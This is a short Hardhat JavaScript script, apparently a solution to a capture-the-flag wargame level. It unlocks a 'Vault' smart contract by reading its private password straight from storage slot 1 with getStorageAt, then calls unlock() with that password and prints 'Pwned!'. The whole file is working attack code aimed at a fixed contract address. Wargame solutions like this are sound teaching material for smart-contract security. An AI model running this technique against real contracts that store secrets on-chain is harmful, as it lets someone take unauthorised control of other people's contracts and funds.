const { ethers } = require("hardhat")

vaultInstanceAddress = "0x5d2368e0f7E096d29e6aD0b49187301050B43834"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Get Vault contract */

  console.log("Connecting to your instance of Vault contract...")
  const vault = await ethers.getContractAt("Vault", vaultInstanceAddress, deployer)

  /* Running the attack */

  console.log("Getting password directly from storage slot with getStorageAt...")

  const response = await ethers.provider.getStorageAt(vault.address, 1)
  console.log(`Vault's Password: ${response}`)

  console.log("Using password to unlock() the Vault...")
  const unlockTx = await vault.unlock(response.toString())
  await unlockTx.wait(1)

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
